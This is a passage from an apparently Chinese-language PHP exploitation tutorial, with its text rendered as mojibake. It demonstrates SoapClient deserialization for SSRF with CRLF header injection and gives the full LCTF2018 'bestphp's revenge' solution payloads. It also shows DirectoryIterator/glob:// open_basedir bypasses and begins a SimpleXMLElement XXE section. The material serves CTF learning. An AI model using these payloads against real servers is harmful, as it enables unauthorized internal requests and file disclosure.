<p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª <code>__call</code> æ–¹æ³•ï¼Œå½“ <code>__call</code> æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª <code>__call</code> æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚SoapClient è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚</p>
<p>è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li>
</ul>
<h3 id="ä½¿ç”¨-soapclient-ç±»è¿›è¡Œ-ssrf-1">ä½¿ç”¨ SoapClient ç±»è¿›è¡Œ SSRF
</h3><p>çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œå°±å¾ˆå®¹æ˜“æ„é€ å‡ºSSRFçš„åˆ©ç”¨Payloadäº†ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°çš„locationé€‰é¡¹è®¾ç½®ä¸ºtarget_urlã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://47.xxx.xxx.72:2333/aaa&#39;</span><span class="p">,</span> <span class="s1">&#39;uri&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://47.xxx.xxx.72:2333&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">();</span>    <span class="c1">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯ï¼Œç”±äºå®ƒä»…é™äºHTTP/HTTPSåè®®ï¼Œæ‰€ä»¥ç”¨å¤„ä¸æ˜¯å¾ˆå¤§ã€‚è€Œå¦‚æœè¿™é‡ŒHTTPå¤´éƒ¨è¿˜å­˜åœ¨CRLFæ¼æ´çš„è¯ï¼Œä½†æˆ‘ä»¬åˆ™å¯ä»¥é€šè¿‡SSRF+CRLFï¼Œæ’å…¥ä»»æ„çš„HTTPå¤´ã€‚å¦‚ä¸‹æµ‹è¯•ä»£ç ï¼Œæˆ‘ä»¬åœ¨HTTPå¤´ä¸­æ’å…¥ä¸€ä¸ªcookieï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$target</span> <span class="o">=</span> <span class="s1">&#39;http://47.xxx.xxx.72:2333/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span> <span class="o">=&gt;</span> <span class="nv">$target</span><span class="p">,</span> <span class="s1">&#39;user_agent&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;WHOAMI</span><span class="se">\r\n</span><span class="s2">Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&#34;</span><span class="p">,</span> <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;test&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">();</span>    <span class="c1">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ä¾‹é¢˜bestphps-revenge">ä¾‹é¢˜ï¼šbestphp&rsquo;s revenge
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;implode&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nx">reset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">),</span> <span class="s1">&#39;welcome_to_the_lctf2018&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç›®å½•æ‰«ææœ‰flag.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">only</span> <span class="nx">localhost</span> <span class="nx">can</span> <span class="nx">get</span> <span class="nx">flag</span><span class="o">!</span><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;only localhost can get flag!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="s1">&#39;LCTF{*************************}&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">       <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">only</span> <span class="nx">localhost</span> <span class="nx">can</span> <span class="nx">get</span> <span class="nx">flag</span><span class="o">!</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯è§å½“REMOTE_ADDRç­‰äº127.0.0.1æ—¶ï¼Œå°±ä¼šåœ¨sessionä¸­æ’å…¥flagï¼Œå°±èƒ½å¾—åˆ°flagã€‚å¾ˆæ˜æ˜¾äº†ï¼Œè¦åˆ©ç”¨ssrfã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„ssrfåˆ©ç”¨ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³åˆ°åˆ©ç”¨PHPåŸç”Ÿç±»SoapClientè§¦å‘ååºåˆ—åŒ–å¯¼è‡´SSRFã€‚å¹¶ä¸”ï¼Œç”±äºflagä¼šè¢«æ’å…¥åˆ°sessionä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸€å®šéœ€è¦æºå¸¦ä¸€ä¸ªcookieå³PHPSESSIDå»è®¿é—®å®ƒæ¥ç”Ÿæˆè¿™ä¸ªsessionæ–‡ä»¶ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$target</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span> <span class="o">=&gt;</span> <span class="nv">$target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;user_agent&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;N0rth3ty</span><span class="se">\r\n</span><span class="s2">Cookie: PHPSESSID=klr898lmagsa80co3ghnhkt932</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;123&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$attack</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$payload</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œè¿™ä¸ªPOCå°±æ˜¯åˆ©ç”¨CRLFä¼ªé€ æœ¬åœ°è¯·æ±‚SSRFå»è®¿é—®flag.phpï¼Œå¹¶å°†å¾—åˆ°çš„flagç»“æœä¿å­˜åœ¨cookieä¸º <code>PHPSESSID=klr898lmagsa80co3ghnhkt932</code> çš„sessionä¸­ã€‚</p>
<p>ç„¶åï¼Œæˆ‘ä»¬å°±è¦æƒ³åŠæ³•ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡ï¼Œä½†è¿™é‡Œæœ‰æ²¡æœ‰ååºåˆ—åŒ–ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬åœ¨é¢˜ç›®æºç ä¸­å‘ç°äº†session_start();ï¼Œå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨sessionååºåˆ—åŒ–æ¼æ´ã€‚ä½†æ˜¯å¦‚æœæƒ³è¦åˆ©ç”¨sessionååºåˆ—åŒ–æ¼æ´çš„è¯ï¼Œæˆ‘ä»¬å¿…é¡»è¦æœ‰ <code>ini_set()</code> è¿™ä¸ªå‡½æ•°æ¥æ›´æ”¹ <code>session.serialize_handler</code> çš„å€¼ï¼Œå°†sessionååºåˆ—åŒ–å¼•æ“ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œæœ¬æ¥åº”è¯¥ä½¿ç”¨ini_set()è¿™ä¸ªå‡½æ•°çš„ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¸æ¥å—æ•°ç»„ï¼Œæ‰€ä»¥å°±ä¸è¡Œäº†ã€‚äºæ˜¯æˆ‘ä»¬å°±ç”¨session_start()å‡½æ•°æ¥ä»£æ›¿ï¼Œå³æ„é€  <code>session_start(serialize_handler=php_serialize)</code> å°±è¡Œäº†ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é¢˜ç›®ä¸­çš„ <code>call_user_func($_GET['f'], $_POST);</code> å‡½æ•°ï¼Œä¼ å…¥GETï¼š/?f=session_startã€POSTï¼šserialize_handler=php_serializeï¼Œå®ç° <code>session_start(serialize_handler=php_serialize)</code> çš„è°ƒç”¨æ¥ä¿®æ”¹æ­¤é¡µé¢çš„åºåˆ—åŒ–å¼•æ“ä¸ºphp_serializeã€‚</p>
<p>è¿™é‡Œè¿˜åˆ©ç”¨åˆ°sessionååºåˆ—åŒ–çš„ä¸€ä¸ªç‚¹</p>
<p>å½“å­˜å‚¨æ˜¯php_serializeå¤„ç†ï¼Œç„¶åè°ƒç”¨æ—¶phpå»å¤„ç†ï¼Œå¦‚æœè¿™æ—¶æ³¨å…¥çš„æ•°æ®æ—¶<code>a=|O:4:â€œtestâ€:0:{}</code>ï¼Œé‚£ä¹ˆsessionä¸­çš„å†…å®¹æ˜¯<code>a:1:{s:1:â€œaâ€;s:16:&quot;|O:4:â€œtestâ€:0:{}&quot;;}</code>ï¼Œé‚£ä¹ˆ<code>a:1:{s:1:â€œaâ€;s:16:&quot;</code>ä¼šè¢«phpè§£ææˆé”®åï¼Œåé¢å°±æ˜¯ä¸€ä¸ªtestå¯¹è±¡çš„æ³¨å…¥ã€‚
é€šè¿‡è¿™ä¸ªæˆ‘ä»¬å°±èƒ½å®ç°<code>session_start([â€˜serialize_handlerâ€™=&gt;â€˜php_serializeâ€™])</code>è¾¾åˆ°æ³¨å…¥çš„æ•ˆæœã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET:
</span></span><span class="line"><span class="cl">?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dklr898lmagsa80co3ghnhkt932%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
</span></span><span class="line"><span class="cl">POST:
</span></span><span class="line"><span class="cl">serialize_handler=php_serialize
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬æˆåŠŸå°†æˆ‘ä»¬phpåŸç”Ÿç±»SoapClientæ„é€ çš„payloadä¼ å…¥äº† <code>PHPSESSID=klr898lmagsa80co3ghnhkt932</code> çš„sessionä¸­ï¼Œå½“é¡µé¢é‡æ–°åŠ è½½æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å°†å…¶ååºåˆ—åŒ–ã€‚</p>
<p>ä½†æ­¤æ—¶è¿˜ä¸ä¼šè§¦å‘SSRFï¼Œéœ€è¦è§¦å‘ <code>__call</code> æ–¹æ³•æ¥é€ æˆSSRFï¼Œè¯¥æ–¹æ³•åœ¨è®¿é—®å¯¹è±¡ä¸­ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæ‰€ä»¥å•çº¯ååºåˆ—åŒ–è¿˜ä¸è¡Œï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®¿é—®è¯¥å¯¹è±¡ä¸­ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†å¦‚ä¸‹è¿™æ®µä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
</span></span><span class="line"><span class="cl">call_user_func($b, $a);
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨extractå‡½æ•°å°†å˜é‡bè¦†ç›–ä¸ºcall_user_funcï¼Œè¿™æ ·ï¼Œå°±æˆäº†ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">call_user_func(call_user_func, array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;));
</span></span></code></pre></td></tr></table>
</div>
</div><p>call_user_func()å‡½æ•°æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯å½“åªä¼ å…¥ä¸€ä¸ªæ•°ç»„æ—¶ï¼Œå¯ä»¥ç”¨call_user_func()æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•ï¼Œcall_user_func()ä¼šå°†è¿™ä¸ªæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå€¼å½“åšç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“åšæ–¹æ³•åã€‚</p>
<p>æˆ‘ä»¬è¦†ç›–å®Œåå˜æˆ<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code></p>
<p>è¿™æ ·ä¹Ÿå°±æ˜¯ä¼šè®¿é—®æˆ‘ä»¬æ„é€ çš„sessionå¯¹è±¡ä¸­çš„welcome_to_the_lctf2018æ–¹æ³•ï¼Œè€Œwelcome_to_the_lctf2018æ–¹æ³•ä¸å­˜åœ¨ï¼Œå°±ä¼šè§¦å‘ <code>__call</code> æ–¹æ³•ï¼Œé€ æˆssrfå»è®¿é—®flag.phpã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET:
</span></span><span class="line"><span class="cl">?f=extract&amp;name=SoapClient
</span></span><span class="line"><span class="cl">POST:
</span></span><span class="line"><span class="cl">b=call_user_func
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå†ç”¨å‰é¢çš„phpsesseionidæ¥è®¿é—®å°±ä¼šå›æ˜¾flag</p>
<h2 id="ä½¿ç”¨-directoryiterator-ç±»ç»•è¿‡-open_basedir">ä½¿ç”¨ DirectoryIterator ç±»ç»•è¿‡ open_basedir
</h2><h3 id="directoryiteratorç±»">DirectoryIteratorç±»
</h3><p>DirectoryIteratorä¸glob://åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥åˆ—ä¸¾å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// test.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;whoami&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$a</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"># payloadä¸€å¥è¯çš„å½¢å¼:
</span></span></span><span class="line"><span class="cl"><span class="err">$a = new DirectoryIterator(&#34;glob:///*&#34;);foreach($a as $f){echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¼ å‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?whoami=glob:///*
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°±èƒ½è¯»æ ¹ç›®å½•ä¸‹æ–‡ä»¶</p>
<h3 id="filesystemiteratorç±»">FilesystemIteratorç±»
</h3><p>FilesystemIteratorç±»ç»§æ‰¿äºDirectoryIteratorç±»,æ‰€ä»¥ä¸¤è€…ä½œç”¨å’Œç”¨æ³•åŸºæœ¬ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºFilesystemIteratorä¼šæ˜¾ç¤ºæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œè€ŒDirectoryIteratoråªæ˜¾ç¤ºæ–‡ä»¶å</p>
<h3 id="globiteratorç±»">GlobIteratorç±»
</h3><p>ç”±å®˜æ–¹è¯´æ˜æˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¿™ä¸ªåŸç”Ÿç±»æ˜¯è‡ªå¸¦globçš„ï¼ŒGlobIteratorç±»çš„ç‰¹ç‚¹åªéœ€è¦çŸ¥é“éƒ¨åˆ†åç§°å¯ä»¥è¿›è¡Œéå†ï¼Œå†…ç½®çš„é­”æœ¯æ–¹æ³•æ˜¯__toStringã€‚è¿™ä¸ªå°±ä¸éœ€è¦æ‰“globæˆ–è€…fileä¼ªåè®®äº†</p>
<h3 id="splfileinfo-ç±»">SplFileInfo ç±»
</h3><p>SplFileInfo ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œï¼ŒSplFileInfo::__toStringå°†æ–‡ä»¶è·¯å¾„ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼Œè¿™ä¸ªå¯ä»¥å®ç°æ–‡ä»¶è¯»å–</p>
<h2 id="ä½¿ç”¨-simplexmlelement-ç±»è¿›è¡Œ-xxe">ä½¿ç”¨ SimpleXMLElement ç±»è¿›è¡Œ XXE
</h2><p>SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»ç”¨äºè§£æ XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚</p>
<p><img src="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250316120209761.png"
	width="1005"
	height="795"
	srcset="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250316120209761_hu2935371367716912466.png 480w, /p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250316120209761_hu16363962392116284738.png 1024w"
	loading="lazy"
	
		alt="image-20250316120209761"
	
	
		class="gallery-image" 
		data-flex-grow="126"
		data-flex-basis="303px"
	
></p>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°data_is_urlè¦æ‰“å¼€ã€‚è®¾ç½®ä¸ºtrueï¼Œç¬¬ä¸€ä¸ªå‚æ•° data å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„payloadçš„urlåœ°å€ï¼Œå³ç”¨äºå¼•å…¥çš„å¤–éƒ¨å®ä½“çš„urlã€‚ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸º2</p>
